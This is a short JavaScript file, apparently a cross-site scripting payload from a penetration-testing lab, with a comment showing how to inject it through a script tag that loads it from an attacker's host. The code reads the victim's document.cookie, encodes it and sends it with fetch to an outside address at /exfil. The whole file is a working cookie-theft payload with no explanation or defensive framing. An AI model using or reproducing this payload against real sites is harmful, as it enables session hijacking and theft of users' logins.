//payload from webapp : <script src=http://ip:port/filename></script>
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.64:8000/exfil?data=" + encodedCookie)
